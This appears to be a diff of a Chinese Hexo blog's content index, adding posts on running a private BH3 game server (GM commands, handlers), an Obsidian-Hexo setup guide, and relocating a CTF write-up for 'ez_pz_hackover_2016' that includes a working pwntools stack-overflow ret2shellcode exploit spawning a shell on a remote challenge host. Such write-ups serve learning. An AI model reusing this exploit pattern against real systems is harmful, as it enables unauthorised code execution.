+<h4 id="下载活动资源失败，请确定读写权限以及存储空间后点击重试"><a href="#下载活动资源失败，请确定读写权限以及存储空间后点击重试" class="headerlink" title="下载活动资源失败，请确定读写权限以及存储空间后点击重试"></a>下载活动资源失败，请确定读写权限以及存储空间后点击重试</h4><img src="/posts/5fd89f19/image-20241122124133759.png" class="" title="image-20241122124133759">
+
+<p>重启游戏继续报错，查看详细信息发现是声音映射文件出错</p>
+<img src="/posts/5fd89f19/image-20241122120519897.png" class="" title="image-20241122120519897">
+
+<p>对比query_gateway后发现缺少”manifest”字段</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;manifest&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Audio&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;platform&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Windows&quot;</span><span class="punctuation">:</span> <span class="string">&quot;manifest_0b6ab335.m&quot;</span>	<span class="comment">//固定值</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;revision&quot;</span><span class="punctuation">:</span> <span class="number">650645</span>	<span class="comment">// 固定值</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="服务器使用"><a href="#服务器使用" class="headerlink" title="服务器使用"></a>服务器使用</h2><h3 id="GM指令"><a href="#GM指令" class="headerlink" title="GM指令"></a>GM指令</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">------------------------------【GM 命令】----------------------------</span><br><span class="line">进入游戏在游戏内聊天窗口输入</span><br><span class="line">以下是可用的命令：</span><br><span class="line">-----------------</span><br><span class="line">level &lt;number&gt;</span><br><span class="line">设置玩家等级（人物88级，数字改多少就是多少级。最高应该是89）</span><br><span class="line">例如:</span><br><span class="line">level 88</span><br><span class="line">-----------------</span><br><span class="line">avatar &lt;add|modify&gt; &lt;avatarId&gt; &lt;...&gt;</span><br><span class="line">将角色添加到用户帐户或修改角色信息</span><br><span class="line">例如:</span><br><span class="line">avatar add 713</span><br><span class="line">avatar modify 713 Level 80</span><br><span class="line">请注意 字母L是大写的</span><br><span class="line">-----------------</span><br><span class="line">avatar modify -1 level 80（一键角色80级）</span><br><span class="line">avatar modify -1 Star 5（全部SSS级）</span><br><span class="line">-----------------</span><br><span class="line">give &lt;avatars|weapons|stigmata|materials|dress&gt;.</span><br><span class="line">获取所有角色， 、武器、徽章、材料或服装</span><br><span class="line">例如:</span><br><span class="line">give avatars（全部角色）</span><br><span class="line">give weapons（全部武器）</span><br><span class="line">give stigmata（全部圣痕）</span><br><span class="line">give materials（全部材料）危险操作</span><br><span class="line">give dress（全部衣服）</span><br><span class="line">give material-id 100 5（给id为5的物品加100个）</span><br><span class="line">give gold 999999（加金币）</span><br><span class="line">-----------------</span><br><span class="line">  give    avatars   weapons  stigmata  dress   materials</span><br><span class="line">获取所有    角色       武器      徽章    服装      材料（可能会炸存档，不建议使用）</span><br><span class="line">-----------------</span><br></pre></td></tr></table></figure>
+
+<h3 id="删库重开"><a href="#删库重开" class="headerlink" title="删库重开"></a>删库重开</h3><p>删除mongod的<code>data</code>目录中所有内容即可。</p>
+<h3 id="更新cg动画为中文"><a href="#更新cg动画为中文" class="headerlink" title="更新cg动画为中文"></a>更新cg动画为中文</h3><p>找国服的Video重命名后替换即可</p>
+<h3 id="解包图片等资源"><a href="#解包图片等资源" class="headerlink" title="解包图片等资源"></a>解包图片等资源</h3><p>使用<a href="https://github.com/RazTools/Studio">AssetStudio</a>工具来提取.&#x2F;StreamingAssets&#x2F;Asb&#x2F;pc中的wmv数据。</p>
+]]></content>
+      <tags>
+        <tag>教程</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Hexo与Typora图片路径统一</title>
     <url>/posts/102fc9fc.html</url>
     <content><![CDATA[<p>由于Typora和Hexo的默认图片存储路径不同，导致Hexo每次部署都需要手动修改图片路径，之后使用Typora本地查看也很不方便，因此在此记录下修改过程。</p>
@@ -2750,22 +2870,76 @@
       </tags>
   </entry>
   <entry>
-    <title>【ez_pz_hackover_2016】WriteUp</title>
-    <url>/posts/478cb6ca.html</url>
-    <content><![CDATA[<p><code>checksec</code>发现NX保护未开启，因此可以考虑Ret2Shellcode。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/home/bronya/Documents/CTF/pwn17/ez_pz_hackover_2016&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    Stack:    Executable</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
+    <title>Obsidian+Hexo使用</title>
+    <url>/posts/f1534c51.html</url>
+    <content><![CDATA[<p>使用obsidian来管理博客，记录搭建的过程</p>
+<h2 id="使用Obsidian的一些优势"><a href="#使用Obsidian的一些优势" class="headerlink" title="使用Obsidian的一些优势"></a>使用Obsidian的一些优势</h2><ol>
+<li>方便管理</li>
+<li>支持创建Front-Matter模版</li>
+<li>支持内链</li>
+</ol>
+<h2 id="Obsidian内链"><a href="#Obsidian内链" class="headerlink" title="Obsidian内链"></a>Obsidian内链</h2><p>安装<a href="https://github.com/Cyrusky/hexo-backlink">Hexo-Backlink</a>插件</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install hexo-backlink</span><br></pre></td></tr></table></figure>
 
-<p>ida查看，发现存在栈溢出漏洞，其中n&#x3D;0x400，因此可以尝试向dest中写入shellcode。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *__cdecl <span class="title function_">vuln</span><span class="params">(<span class="type">int</span> src, <span class="type">size_t</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> dest[<span class="number">50</span>]; <span class="comment">// [esp+6h] [ebp-32h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memcpy</span>(dest, &amp;src, n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>构造exp:</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./ez_pz_hackover_2016&#x27;)</span></span><br><span class="line"><span class="comment"># gdb.attach(p, &#x27;b *0x0804865D&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26972</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ez_pz_hackover_2016&#x27;</span>)</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())<span class="comment">#生成shellcode，asm函数是进行汇编</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Yippie, lets crash: 0x&#x27;</span>)</span><br><span class="line">buf_addr = <span class="built_in">int</span>(p.recv(<span class="number">8</span>), <span class="number">16</span>) - <span class="number">0x1c</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(buf_addr))</span><br><span class="line">shellcode_addr = buf_addr</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">b&#x27;crashme\x00&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x16</span>-<span class="number">8</span>), <span class="number">0x0</span>, shellcode_addr, shellcode)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>在<code>_config.yaml</code>中添加<code>backlink:true</code>字段。</p>
+<p>在obsidian中设置：<br>“设置” -&gt; “文件与链接” -&gt; “内部链接类型” , 设置为 “基于当前笔记的相对路径”<br>“设置” -&gt; “文件与链接” -&gt; “使用WIKI链接” , 打开</p>
+<h3 id="问题解决-1：反向链接"><a href="#问题解决-1：反向链接" class="headerlink" title="问题解决 1：反向链接"></a>问题解决 1：反向链接</h3><p>研究了一下backlink这个插件，发现之前有人提过一个<a href="https://github.com/Cyrusky/hexo-backlink/issues/10">issue</a>，提到post文件名如果有日期格式的话插件就会报错，如果去掉只剩title就可以正常运行。  经验证目前应该仍然存在这个问题。</p>
+<p>修改了下hexo-backlink源码的逻辑，上传到github上了<a href="https://github.com/Eknight-Eutopia/hexo-backlink/blob/main/src/index.ts">Eknight-Eutopia&#x2F;hexo-backlink</a></p>
+<p>可以根据以上内容修改hexo博客里node_modules的hexo-backlink&#x2F;index.js的action函数<br>主要修改是添加了对日期的识别，如果为日期格式则只匹配其中的title（也就是说如果后续改title但没改文件名的话应该也是有问题的），这样基本上是可以使用的。<br>另外，看github上作者近期也没有更新，所以直接修改node_modules其实也不需要担心后面升级被覆盖了~~~</p>
+<h3 id="问题解决2：模版渲染"><a href="#问题解决2：模版渲染" class="headerlink" title="问题解决2：模版渲染"></a>问题解决2：模版渲染</h3><p>在<code>_post</code>文件夹中创建了<code>Templates/templates_for_obsidian.md</code>来作为新建模版，但是后面每次启动hexo都会渲染该文件，导致自动为其设置了abbrlink，以至于后面所有的文件都是这个abbrlink，出现问题。</p>
+<p>参考链接：<a href="https://hexo.io/zh-cn/docs/configuration#%E7%9B%AE%E5%BD%95">Hexo配置</a></p>
+<p>禁止Hexo渲染模版文件即可：<br>在<code>_config.yml</code>中修改以下内容</p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># exclude template posts</span></span><br><span class="line"><span class="attr">skip_render:</span> <span class="string">&quot;_posts/Templates/*&quot;</span></span><br></pre></td></tr></table></figure>
 
 ]]></content>
-      <tags>
-        <tag>Pwn</tag>
-        <tag>Ret2Shellcode</tag>
-      </tags>
+  </entry>
+  <entry>
+    <title>BH3服务器开发与完善</title>
+    <url>/posts/18d20718.html</url>
+    <content><![CDATA[<h2 id="功能完善"><a href="#功能完善" class="headerlink" title="功能完善"></a>功能完善</h2><p>这部分的主要逻辑实现在GameServer目录中的Handlers中</p>
+<h3 id="主线功能"><a href="#主线功能" class="headerlink" title="主线功能"></a>主线功能</h3><ul>
+<li><a href="/posts/837b0a67.html" title="PemukulPaku-GetStageDataReqHandler">GetStageDataReq</a></li>
+<li><a href="/posts/4eb70f95.html" title="PemukulPaku-StageEndRspHandler">StageEndRsp</a></li>
+<li><a href="/posts/f6185e2f.html" title="PemukulPaku-TakeStageActChallengeRewardReqHandler">TakeStageActChallengeRewardReq</a></li>
+<li><a href="/posts/edbf9f10.html" title="PemukulPaku-GetStageChapterReqHandler">GetStageChapterReq</a></li>
+<li>FinishGuideReportReq</li>
+<li>UpdateMissionProgressReq</li>
+<li><a href="/posts/7a44cc62.html" title="PemukulPaku-GetStageDropDisplayReqHandler">GetStageDropDisplayReq</a></li>
+</ul>
+<h3 id="人物功能"><a href="#人物功能" class="headerlink" title="人物功能"></a>人物功能</h3><ul>
+<li><a href="/posts/1b7a2e3d.html" title="PemukulPaku-AvatarStarUpReq">AvatarStarUpReq</a></li>
+<li><a href="/posts/902f2cb2.html" title="PemukulPaku-AvatarFragmentTransformReq">AvatarFragmentTransformReq</a></li>
+</ul>
+<h3 id="材料装备功能"><a href="#材料装备功能" class="headerlink" title="材料装备功能"></a>材料装备功能</h3><ul>
+<li><a href="/posts/2a86d11c.html" title="PemukulPaku-EquipmentSellReqHandler">EquipmentSellReq</a></li>
+<li><a href="/posts/8fbda5e4.html" title="PemukulPaku-IslandDisjoinEquipmentReqHandler">IslandDisjoinEquipmentReq</a></li>
+<li><a href="/posts/783a5418.html" title="PemukulPaku-EquipmentEvoReqHandler">EquipmentEvoReq</a></li>
+</ul>
+<h3 id="商店功能"><a href="#商店功能" class="headerlink" title="商店功能"></a>商店功能</h3><ul>
+<li><a href="/posts/6b761fa9.html" title="GetShopListReq">GetShopListReq</a></li>
+<li><a href="/posts/308d4464.html" title="PemukulPaku-BuyGoodsReqHandler">BuyGoodsReq</a></li>
+</ul>
+<h3 id="充值功能"><a href="#充值功能" class="headerlink" title="充值功能"></a>充值功能</h3><ul>
+<li><a href="/posts/8bee2b6e.html" title="PemukulPaku-GetProductListReqHandler">GetProductListReq</a></li>
+<li><a href="/posts/dc044fb2.html" title="PemukulPaku-BuyProductReq">BuyProductReq</a></li>
+<li><a href="/posts/8063f392.html" title="PemukulPaku-GetShoppingMallListReqHandler">GetShoppingMallListReq</a></li>
+</ul>
+<h3 id="深渊功能"><a href="#深渊功能" class="headerlink" title="深渊功能"></a>深渊功能</h3><ul>
+<li><a href="/posts/ddb0d42f.html" title="PemukulPaku-GetMissionRewardReqHandler">GetMissionRewardReq</a></li>
+</ul>
+<h3 id="抽卡功能"><a href="#抽卡功能" class="headerlink" title="抽卡功能"></a>抽卡功能</h3><ul>
+<li><a href="/posts/916f0cfe.html" title="GachaReqHandler">GachaReq</a></li>
+<li><a href="/posts/c87482d2.html" title="GetGachaDisplayReq">GetGachaDisplayReq</a></li>
+</ul>
+<h3 id="日常功能"><a href="#日常功能" class="headerlink" title="日常功能"></a>日常功能</h3><ul>
+<li>LoginWishGetMainDataReq(每日登录领取奖励)</li>
+<li>GetWeeklyRoutineActivityReq</li>
+</ul>
+<h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><ul>
+<li>GetHasGotItemIdListReq</li>
+<li>GetArmadaDataReq(舰团)</li>
+</ul>
+]]></content>
   </entry>
   <entry>
     <title>【ciscn_2019_es_2】WriteUp</title>
@@ -2789,6 +2963,24 @@
       <tags>
         <tag>Pwn</tag>
         <tag>栈迁移</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>【ez_pz_hackover_2016】WriteUp</title>
+    <url>/posts/478cb6ca.html</url>
+    <content><![CDATA[<p><code>checksec</code>发现NX保护未开启，因此可以考虑Ret2Shellcode。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/home/bronya/Documents/CTF/pwn17/ez_pz_hackover_2016&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    Stack:    Executable</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
+
+<p>ida查看，发现存在栈溢出漏洞，其中n&#x3D;0x400，因此可以尝试向dest中写入shellcode。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *__cdecl <span class="title function_">vuln</span><span class="params">(<span class="type">int</span> src, <span class="type">size_t</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> dest[<span class="number">50</span>]; <span class="comment">// [esp+6h] [ebp-32h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memcpy</span>(dest, &amp;src, n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>构造exp:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./ez_pz_hackover_2016&#x27;)</span></span><br><span class="line"><span class="comment"># gdb.attach(p, &#x27;b *0x0804865D&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26972</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ez_pz_hackover_2016&#x27;</span>)</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())<span class="comment">#生成shellcode，asm函数是进行汇编</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Yippie, lets crash: 0x&#x27;</span>)</span><br><span class="line">buf_addr = <span class="built_in">int</span>(p.recv(<span class="number">8</span>), <span class="number">16</span>) - <span class="number">0x1c</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(buf_addr))</span><br><span class="line">shellcode_addr = buf_addr</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">b&#x27;crashme\x00&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x16</span>-<span class="number">8</span>), <span class="number">0x0</span>, shellcode_addr, shellcode)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>Pwn</tag>
+        <tag>Ret2Shellcode</tag>
       </tags>
   </entry>
   <entry>
